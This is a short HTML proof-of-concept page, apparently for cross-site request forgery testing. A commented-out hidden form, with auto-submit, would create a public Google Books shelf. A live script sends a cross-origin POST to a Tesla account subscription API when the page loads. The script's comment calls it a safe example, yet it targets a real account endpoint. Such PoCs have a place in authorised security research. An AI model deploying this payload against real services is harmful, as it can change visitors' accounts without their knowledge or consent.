<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>API Request PoC</title>
    </head>
    <body>
        <h2>API GET Request PoC</h2>
        <!-- <form action="https://books.google.com/books?op=cl_update&sig=ACfU3U0muIggfUwa9I5Fl5Ad_QbA7If8Hw&jscmd=ClUpdate&as_coll=1001&cl_title=ABCD&cl_mode=public" method="POST">
      <input type="hidden" name="cl_des" value="description" />
      <input type="submit" value="Click to create book shelf" />
  </form> -->
        <script>
            //document.forms[0].submit();

            // Example safe API (replace with your own test endpoint)
            const url = "https://www.tesla.com/teslaaccount/subscription-preferences/api/subscribe";

            fetch(url, {
                method: "POST",
                headers: {
                    Accept: "application/json",
                },
                body: JSON.stringify({"categoryId":"BASIC"}),
            })
                .then((response) => {
                    if (!response.ok) {
                        throw new Error("Network response was not ok " + response.statusText);
                    }
                    return response.json();
                })
                .then((data) => {
                    console.log("API Response:", data);
                })
                .catch((error) => {
                    console.error("Fetch error:", error);
                });
        </script>
    </body>
</html>
